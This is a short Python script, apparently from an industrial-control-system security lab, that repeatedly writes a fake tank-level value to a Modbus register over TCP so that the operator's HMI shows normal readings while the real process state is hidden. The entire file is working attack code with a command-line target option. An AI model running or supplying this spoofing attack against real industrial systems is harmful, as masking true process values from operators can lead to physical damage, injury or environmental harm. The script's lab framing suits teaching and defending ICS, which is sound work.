#!/usr/bin/env python3
"""
Sensor value spoofing attack - Session 3 Lab
Writes a fake tank level value to the register that the HMI reads.
The operator sees normal values while the actual process may be in trouble.

Usage:
    python3 sensor_spoof.py --target <ip> --port <port> [--fake-level N]
"""

import argparse
import socket
import struct
import time

def write_register(target, port, addr, value):
    mbap = struct.pack('>HHHB', 1, 0x0000, 6, 1)
    pdu = struct.pack('>BHH', 0x06, addr, value)
    s = socket.socket()
    s.settimeout(3)
    s.connect((target, port))
    s.sendall(mbap + pdu)
    s.recv(1024)
    s.close()

def main():
    p = argparse.ArgumentParser()
    p.add_argument('--target', required=True)
    p.add_argument('--port', type=int, default=502)
    p.add_argument('--fake-level', type=int, default=55, help='Fake tank level %% to display')
    p.add_argument('--duration', type=int, default=30, help='Seconds to maintain the spoof')
    args = p.parse_args()

    print(f"[*] Sensor spoofing attack against {args.target}:{args.port}")
    print(f"[*] Will write fake value {args.fake_level} to register 40002 (tank_level)")
    print(f"[*] Maintaining spoof for {args.duration} seconds")
    print()

    start = time.time()
    writes = 0
    while time.time() - start < args.duration:
        write_register(args.target, args.port, 1, args.fake_level)
        writes += 1
        print(f"    [{int(time.time()-start):3d}s] Write #{writes}: tank_level = {args.fake_level}", end='\r')
        time.sleep(1)

    print()
    print(f"[+] Spoof complete. Made {writes} writes.")
    print("    The HMI displayed the fake value throughout.")
    print("    Real tank level was whatever the process physics determined.")

if __name__ == '__main__':
    main()
